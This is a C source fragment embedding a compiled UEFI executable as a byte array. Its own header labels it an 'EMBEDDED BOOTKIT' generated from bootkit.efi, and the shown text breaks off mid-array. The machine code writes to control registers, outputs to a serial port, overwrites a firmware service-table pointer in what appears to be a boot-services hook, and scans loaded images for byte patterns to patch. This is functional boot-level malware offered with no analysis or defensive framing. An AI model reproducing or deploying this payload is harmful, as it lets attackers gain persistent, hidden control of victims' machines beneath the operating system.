// ==================== EMBEDDED BOOTKIT ====================
// Auto-generated from bootkit.efi - DO NOT EDIT MANUALLY
unsigned char bootkit_image[] = {
    0x4D, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x05, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x20,
    0x0B, 0x02, 0x0E, 0x2C, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x74, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
    0x2E, 0xFE, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x44, 0x00, 0x00, 0x88, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x4A, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x7F, 0x2B, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x2C, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
    0x5C, 0x0C, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
    0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
    0x00, 0x02, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42,
    0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x84, 0x01, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00,
    0x00, 0x02, 0x00, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x20, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x22, 0xC1, 0x48, 0x89, 0xC8, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x22, 0xE1, 0x48, 0x89, 0xC8, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x20, 0xE0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xC3, 0xC3, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xFB, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xFA, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x9C, 0x58, 0xC3, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0x42, 0x58, 0x4C, 0x8D,
    0x05, 0xCB, 0x29, 0x00, 0x00, 0x48, 0x89, 0x0D, 0x24, 0x40, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x48,
    0x8B, 0x4A, 0x60, 0x48, 0x8B, 0xDA, 0x48, 0x89, 0x0D, 0x0B, 0x40, 0x00, 0x00, 0x48, 0x89, 0x05,
    0x14, 0x40, 0x00, 0x00, 0x48, 0x89, 0x05, 0x25, 0x40, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x50, 0x48,
    0x8D, 0x0D, 0x12, 0x40, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x20, 0xB9, 0x02, 0x02, 0x00, 0x60,
    0x48, 0x89, 0x15, 0xD9, 0x3F, 0x00, 0x00, 0x41, 0x8D, 0x51, 0x10, 0xFF, 0xD0, 0x48, 0x8B, 0x05,
    0xD4, 0x3F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x71, 0x29, 0x00, 0x00, 0x45, 0x33, 0xC9, 0xB9, 0x01,
    0x02, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x50, 0x48, 0x8D, 0x05, 0xEA, 0x3F, 0x00, 0x00, 0x41, 0x8D,
    0x51, 0x10, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xFF, 0xD2, 0x48, 0x8B, 0xD3, 0xE8, 0x46, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x48,
    0x3B, 0xD8, 0x72, 0x28, 0x48, 0x8B, 0x0D, 0x8D, 0x3F, 0x00, 0x00, 0x48, 0x8B, 0x51, 0x70, 0x48,
    0x8B, 0x0D, 0xA2, 0x3F, 0x00, 0x00, 0xFF, 0xD2, 0x48, 0x8B, 0x0D, 0x79, 0x3F, 0x00, 0x00, 0x48,
    0x8B, 0x51, 0x70, 0x48, 0x8B, 0x0D, 0x9E, 0x3F, 0x00, 0x00, 0xFF, 0xD2, 0x48, 0x8B, 0xC3, 0x48,
    0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x15, 0x2D,
    0x3F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x26, 0x34, 0x00, 0x00, 0x33, 0xC9, 0x48, 0xFF, 0xC1, 0x42,
    0x80, 0x3C, 0x01, 0x00, 0x75, 0xF6, 0x48, 0x85, 0xC9, 0x75, 0x0E, 0xBA, 0xFD, 0x03, 0x00, 0x00,
    0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4, 0xEB, 0x31, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24,
    0x60, 0x3C, 0x60, 0x75, 0xF4, 0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x00,
    0xBA, 0xF8, 0x03, 0x00, 0x00, 0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC0, 0x49,
    0x83, 0xF9, 0x10, 0x72, 0xE3, 0x48, 0x85, 0xC9, 0x75, 0xCF, 0x48, 0x8D, 0x0D, 0x77, 0x34, 0x00,
    0x00, 0xE8, 0x56, 0x29, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xEB, 0x33, 0x00, 0x00, 0xE8, 0x4A, 0x29,
    0x00, 0x00, 0x48, 0x8B, 0x0D, 0xDF, 0x3E, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x64, 0x0C, 0x00, 0x00,
    0x45, 0x33, 0xC9, 0x48, 0x8B, 0x81, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0x97, 0x3E, 0x00,
    0x00, 0x41, 0x8D, 0x51, 0x10, 0x48, 0x8D, 0x05, 0xA0, 0x06, 0x00, 0x00, 0x48, 0x89, 0x81, 0xE8,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x86, 0x3E, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B,
    0x41, 0x50, 0x48, 0x8D, 0x0D, 0x87, 0x3E, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24, 0x20, 0xB9, 0x02,
    0x02, 0x00, 0x60, 0xFF, 0xD0, 0x33, 0xC9, 0x4C, 0x8D, 0x0D, 0xB2, 0x33, 0x00, 0x00, 0x48, 0xFF,
    0xC1, 0x42, 0x80, 0x3C, 0x09, 0x00, 0x75, 0xF6, 0x48, 0x85, 0xC9, 0x75, 0x0E, 0xBA, 0xFD, 0x03,
    0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4, 0xEB, 0x31, 0xBA, 0xFD, 0x03, 0x00, 0x00,
    0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4, 0x45, 0x33, 0xC0, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41,
    0x8A, 0x01, 0xBA, 0xF8, 0x03, 0x00, 0x00, 0xEE, 0x49, 0xFF, 0xC0, 0x48, 0xFF, 0xC9, 0x49, 0xFF,
    0xC1, 0x49, 0x83, 0xF8, 0x10, 0x72, 0xE3, 0x48, 0x85, 0xC9, 0x75, 0xCF, 0x48, 0x8D, 0x0D, 0xB5,
    0x33, 0x00, 0x00, 0xE8, 0x94, 0x28, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x79, 0x33, 0x00, 0x00, 0xE8,
    0x88, 0x28, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0x4C, 0x8B, 0xDC, 0x49,
    0x89, 0x4B, 0x08, 0x49, 0x89, 0x53, 0x10, 0x4D, 0x89, 0x43, 0x18, 0x4D, 0x89, 0x4B, 0x20, 0x48,
    0x81, 0xEC, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x13, 0x3E, 0x00, 0x00, 0x48, 0x33, 0xC4,
    0x48, 0x89, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x49, 0x8D, 0x43, 0x10, 0x48, 0xC7, 0x44, 0x24,
    0x28, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC9, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x4C,
    0x24, 0x30, 0x45, 0x33, 0xC0, 0xBA, 0x00, 0x01, 0x00, 0x00, 0xE8, 0xB9, 0x18, 0x00, 0x00, 0x33,
    0xC9, 0x38, 0x4C, 0x24, 0x30, 0x74, 0x0A, 0x48, 0xFF, 0xC1, 0x80, 0x7C, 0x0C, 0x30, 0x00, 0x75,
    0xF6, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x48, 0x85, 0xC9, 0x75, 0x0E, 0xBA, 0xFD, 0x03, 0x00, 0x00,
    0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4, 0xEB, 0x31, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24,
    0x60, 0x3C, 0x60, 0x75, 0xF4, 0x45, 0x33, 0xC0, 0x48, 0x85, 0xC9, 0x74, 0x1D, 0x41, 0x8A, 0x01,
    0xBA, 0xF8, 0x03, 0x00, 0x00, 0xEE, 0x49, 0xFF, 0xC0, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC1, 0x49,
    0x83, 0xF8, 0x10, 0x72, 0xE3, 0x48, 0x85, 0xC9, 0x75, 0xCF, 0x48, 0x8B, 0x8C, 0x24, 0x30, 0x01,
    0x00, 0x00, 0x48, 0x33, 0xCC, 0xE8, 0xF8, 0xFC, 0xFF, 0xFF, 0x48, 0x81, 0xC4, 0x48, 0x01, 0x00,
    0x00, 0xC3, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x8B, 0x41, 0x3C, 0x4C, 0x8B, 0xC1, 0x4C, 0x8B, 0xDA,
    0x8B, 0x8C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x74, 0x55, 0x46, 0x8B, 0x4C, 0x01, 0x20,
    0x42, 0x8B, 0x5C, 0x01, 0x24, 0x4D, 0x03, 0xC8, 0x42, 0x8B, 0x7C, 0x01, 0x1C, 0x49, 0x03, 0xD8,
    0x42, 0x8B, 0x6C, 0x01, 0x18, 0x49, 0x03, 0xF8, 0x33, 0xC9, 0x85, 0xED, 0x74, 0x32, 0x40, 0x8A,
    0x32, 0x41, 0x8B, 0x11, 0x49, 0x03, 0xD0, 0x40, 0x38, 0x32, 0x75, 0x1A, 0x44, 0x8A, 0xD6, 0x49,
    0x8B, 0xC3, 0x49, 0x2B, 0xD3, 0x45, 0x84, 0xD2, 0x74, 0x2D, 0x48, 0xFF, 0xC0, 0x44, 0x8A, 0x10,
    0x44, 0x38, 0x14, 0x10, 0x74, 0xEF, 0xFF, 0xC1, 0x49, 0x83, 0xC1, 0x04, 0x3B, 0xCD, 0x72, 0xD1,
    0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x08, 0x48, 0x8B, 0x6C, 0x24, 0x10, 0x48, 0x8B, 0x74, 0x24,
    0x18, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0xC3, 0x0F, 0xB7, 0x0C, 0x4B, 0x8B, 0x04, 0x8F, 0x49, 0x03,
    0xC0, 0xEB, 0xDF, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48, 0x89,
    0x7C, 0x24, 0x20, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC, 0x48,
    0x81, 0xEC, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xA3, 0x3C, 0x00, 0x00, 0x48, 0x33, 0xC4,
    0x48, 0x89, 0x45, 0xF8, 0x48, 0x8B, 0xF1, 0xC7, 0x45, 0xC8, 0x48, 0x8B, 0xC4, 0x48, 0xB9, 0x12,
    0x00, 0x00, 0x00, 0xC7, 0x45, 0xCC, 0x89, 0x58, 0x10, 0x48, 0x89, 0x4D, 0xB0, 0x48, 0x8D, 0x45,
    0xC8, 0x89, 0x4D, 0xC0, 0x48, 0x8D, 0x55, 0xA8, 0x8B, 0x4E, 0x3C, 0x48, 0x03, 0xCE, 0xC7, 0x45,
    0xD0, 0x89, 0x70, 0x18, 0x4C, 0xC7, 0x45, 0xD4, 0x89, 0x48, 0x20, 0x89, 0x66, 0xC7, 0x45, 0xD8,
    0x48, 0x08, 0xC7, 0x45, 0xE0, 0x4C, 0x89, 0x4C, 0x24, 0xC7, 0x45, 0xE4, 0x20, 0x44, 0x89, 0x44,
    0xC7, 0x45, 0xE8, 0x24, 0x18, 0x89, 0x54, 0xC7, 0x45, 0xEC, 0x24, 0x10, 0x89, 0x4C, 0x66, 0xC7,
    0x45, 0xF0, 0x24, 0x08, 0x44, 0x0F, 0xB7, 0x79, 0x14, 0x44, 0x0F, 0xB7, 0x61, 0x06, 0x4C, 0x03,
    0xF9, 0x48, 0x89, 0x45, 0xA8, 0x33, 0xC9, 0x48, 0x8D, 0x45, 0xE0, 0x48, 0x89, 0x45, 0xB8, 0x44,
    0x8B, 0xD9, 0x48, 0x8B, 0xD9, 0x66, 0x41, 0x3B, 0xCC, 0x0F, 0x83, 0xEC, 0x00, 0x00, 0x00, 0x4D,
    0x8D, 0x57, 0x24, 0x41, 0x8B, 0x42, 0x18, 0x25, 0x20, 0x00, 0x00, 0x22, 0x3D, 0x20, 0x00, 0x00,
    0x20, 0x0F, 0x85, 0xC1, 0x00, 0x00, 0x00, 0x48, 0x63, 0x42, 0x08, 0x4C, 0x8B, 0xC1, 0x41, 0x8B,
    0x3A, 0x45, 0x8B, 0x72, 0xFC, 0x48, 0x03, 0xFE, 0x48, 0x89, 0x45, 0xA0, 0x4C, 0x2B, 0xF0, 0x0F,
    0x84, 0xA3, 0x00, 0x00, 0x00, 0x39, 0x4A, 0x08, 0x7E, 0x23, 0x48, 0x8B, 0x0A, 0x4D, 0x8B, 0xC8,
    0x4C, 0x2B, 0xC9, 0x4C, 0x03, 0xCF, 0x8A, 0x01, 0x42, 0x38, 0x04, 0x09, 0x75, 0x79, 0x48, 0xFF,
    0xC1, 0x48, 0x8B, 0xC1, 0x48, 0x2B, 0x02, 0x48, 0x3B, 0x45, 0xA0, 0x7C, 0xE9, 0x83, 0x7A, 0x08,
    0x3C, 0x7D, 0x64, 0x4C, 0x63, 0x4A, 0x08, 0x49, 0x8D, 0x49, 0x01, 0x49, 0x03, 0xC8, 0x48, 0x03,
    0xCF, 0x8A, 0x41, 0xFF, 0x3C, 0x41, 0x75, 0x2E, 0x8A, 0x01, 0x2C, 0x56, 0x3C, 0x01, 0x77, 0x3B,
    0x49, 0x63, 0xC3, 0x48, 0x8D, 0x0C, 0x80, 0x41, 0x8B, 0x5C, 0xCF, 0x24, 0x48, 0x8D, 0x0D, 0xBD,
    0x2A, 0x00, 0x00, 0x48, 0x03, 0xDE, 0x49, 0x03, 0xD8, 0x48, 0x8B, 0xD3, 0xE8, 0x3B, 0xFD, 0xFF,
    0xFF, 0x48, 0x8B, 0xC3, 0xEB, 0x64, 0x3C, 0x48, 0x75, 0x11, 0x80, 0x39, 0x83, 0x75, 0x0C, 0x80,
    0x79, 0x01, 0xEC, 0x75, 0x06, 0x80, 0x79, 0x02, 0x40, 0x74, 0xC5, 0x49, 0xFF, 0xC1, 0x48, 0xFF,
    0xC1, 0x49, 0x83, 0xF9, 0x3C, 0x7C, 0xAA, 0x49, 0xFF, 0xC0, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x4D,
    0x3B, 0xC6, 0x0F, 0x82, 0x5D, 0xFF, 0xFF, 0xFF, 0x41, 0xFF, 0xC3, 0x48, 0xFF, 0xC3, 0x49, 0x83,
    0xC2, 0x28, 0x49, 0x3B, 0xDC, 0x0F, 0x8C, 0x18, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC2, 0x10, 0x48,
    0x8D, 0x45, 0xC8, 0x48, 0x3B, 0xD0, 0x0F, 0x85, 0xF3, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x7D,
    0x2A, 0x00, 0x00, 0xE8, 0xD4, 0xFC, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x4D, 0xF8, 0x48, 0x33,
    0xCC, 0xE8, 0x7C, 0xFA, 0xFF, 0xFF, 0x4C, 0x8D, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0x5B, 0x38, 0x49, 0x8B, 0x73, 0x40, 0x49, 0x8B, 0x7B, 0x48, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41,
    0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5D, 0xC3, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05, 0x95,
    0x3A, 0x00, 0x00, 0x48, 0x05, 0x18, 0x64, 0x03, 0x00, 0x75, 0x5F, 0x33, 0xC9, 0x4C, 0x8D, 0x05,
    0x54, 0x2A, 0x00, 0x00, 0x48, 0xFF, 0xC1, 0x42, 0x80, 0x3C, 0x01, 0x00, 0x75, 0xF6, 0x48, 0x85,
    0xC9, 0x75, 0x11, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4, 0x48,
    0x83, 0xC4, 0x28, 0xC3, 0xBA, 0xFD, 0x03, 0x00, 0x00, 0xEC, 0x24, 0x60, 0x3C, 0x60, 0x75, 0xF4,
    0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74, 0x24, 0x41, 0x8A, 0x00, 0xBA, 0xF8, 0x03, 0x00, 0x00,
    0xEE, 0x49, 0xFF, 0xC1, 0x48, 0xFF, 0xC9, 0x49, 0xFF, 0xC0, 0x49, 0x83, 0xF9, 0x10, 0x72, 0xE3,
    0x48, 0x85, 0xC9, 0x75, 0xCF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28,
    0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55,
    0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x70, 0x48, 0x8B, 0x05, 0x3E, 0x3A,
    0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x45, 0xF0, 0x45, 0x33, 0xF6, 0x4C, 0x8B, 0xFA, 0x48,
    0x8B, 0xF1, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xC8, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84,
    0xBF, 0x01, 0x00, 0x00, 0x8B, 0x41, 0x3C, 0x4C, 0x8B, 0xC2, 0x48, 0x03, 0xC1, 0x48, 0x8B, 0xD1,
    0x48, 0x89, 0x45, 0xC8, 0x48, 0x8D, 0x0D, 0xBD, 0x29, 0x00, 0x00, 0x41, 0x8B, 0xFE, 0x45, 0x8B,
    0xE6, 0x0F, 0xB7, 0x58, 0x14, 0x48, 0x03, 0xD8, 0x33, 0xC0, 0x48, 0x89, 0x45, 0xE0, 0x88, 0x45,
    0xE8, 0xE8, 0xB6, 0xFB, 0xFF, 0xFF, 0x48, 0x8B, 0x45, 0xC8, 0x45, 0x8B, 0xEE, 0x66, 0x44, 0x3B,
